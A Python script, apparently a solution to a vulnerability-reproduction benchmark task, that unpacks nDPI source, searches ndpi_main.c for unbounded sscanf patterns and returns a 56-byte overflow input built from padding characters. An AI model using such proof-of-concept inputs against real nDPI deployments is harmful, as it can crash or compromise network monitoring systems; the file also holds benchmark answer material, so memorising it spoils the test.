import tarfile
import tempfile
import os
import re
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to analyze source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable function
            ndpi_main_path = Path(tmpdir) / 'src' / 'lib' / 'ndpi_main.c'
            if not ndpi_main_path.exists():
                # Try alternative path patterns
                for path in Path(tmpdir).rglob('ndpi_main.c'):
                    ndpi_main_path = path
                    break
            
            if not ndpi_main_path.exists():
                # Fallback: ground-truth PoC from description
                return b'A' * 56
            
            # Read the source code
            with open(ndpi_main_path, 'r') as f:
                content = f.read()
            
            # Look for the vulnerable function pattern
            # The vulnerability involves tail variable overflow at line 2770
            # We'll generate input that triggers buffer overflow in sscanf
            
            # Pattern to match sscanf calls with potential overflow
            sscanf_pattern = r'scanf\s*\([^)]+,\s*"([^"]*%[^"]*)"'
            matches = re.findall(sscanf_pattern, content)
            
            # Look for patterns with %s or %[ without width specifiers
            vulnerable_patterns = []
            for match in matches:
                if '%s' in match or '%[' in match:
                    # Check if there's no width specification before %s or %[
                    if not re.search(r'%\d+[ds\[%]', match):
                        vulnerable_patterns.append(match)
            
            # Generate PoC based on common vulnerable patterns
            # From the description, we know ground-truth is 56 bytes
            # Create input that will overflow any reasonable buffer
            
            # Common approach: use long string without spaces to overflow %s
            # Use format that matches common custom rule patterns
            poc = b'127.0.0.1/' + b'A' * 46  # Total 56 bytes
            
            # Alternative: if we find specific format patterns
            if vulnerable_patterns:
                # Try to match the first vulnerable pattern
                pattern = vulnerable_patterns[0]
                
                if '%s' in pattern:
                    # Simple string overflow
                    poc = b'A' * 56
                elif '%[' in pattern:
                    # Character class overflow
                    # Find the delimiter in the pattern
                    match = re.search(r'%\[([^\]]+)\]', pattern)
                    if match:
                        # Include valid characters followed by overflow
                        valid_chars = match.group(1)
                        if '^' not in valid_chars:
                            # Inclusive set - use those characters
                            poc = (valid_chars[0] * 56).encode()
                        else:
                            # Exclusive set - use characters NOT in the set
                            # Typically alphanumeric overflow
                            poc = b'@' * 56
            
            return poc if len(poc) == 56 else b'A' * 56
